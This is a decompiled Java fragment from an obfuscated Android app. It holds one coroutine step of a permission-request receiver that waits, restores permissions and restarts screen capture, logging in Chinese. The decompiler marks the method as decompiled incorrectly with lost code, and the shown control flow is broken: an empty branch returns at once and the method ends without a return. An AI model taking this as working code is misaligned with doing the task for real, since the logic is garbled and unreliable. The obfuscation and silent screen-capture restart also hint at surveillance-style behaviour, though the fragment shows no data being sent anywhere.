package com.storm.safe.rock.service;

import android.os.Build;
import com.storm.safe.rock.manager.C0263a5;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$permissionRequestReceiver$1$onReceive$7", m214403f = "dqtvuisjd.kt", m214404l = {5183, 5188}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
public final class dqtvuisjd$permissionRequestReceiver$1$onReceive$7 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52656a1;

    /* renamed from: a2 */
    public final /* synthetic */ dqtvuisjd f52657a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$permissionRequestReceiver$1$onReceive$7(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52657a2 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$permissionRequestReceiver$1$onReceive$7(this.f52657a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$permissionRequestReceiver$1$onReceive$7) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:19:0x003b, code lost:
    
        if (p000.b81.m210571b1(1000, r7) == r0) goto L20;
     */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52656a1;
        dqtvuisjd dqtvuisjdVar = this.f52657a2;
        try {
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 权限恢复失败", e);
        }
        if (i == 0) {
            kg1.m213544f4(obj);
            this.f52656a1 = 1;
            if (b81.m210571b1(500L, this) == coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i != 1) {
            if (i != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            t60.m214714d6("dqtvuisjd", "✅ 权限恢复完成，重新启动屏幕捕获");
            C0263a5 c0263a5 = dqtvuisjdVar.f52370a1;
            if (c0263a5 != null) {
                if (Build.VERSION.SDK_INT >= 30) {
                    c0263a5.m211358b5();
                } else {
                    c0263a5.m211354b0();
                }
            }
            return C1351vv.f60710b1;
        }
        kg1.m213544f4(obj);
        dqtvuisjdVar.m211472g6();
        this.f52656a1 = 2;
    }
}
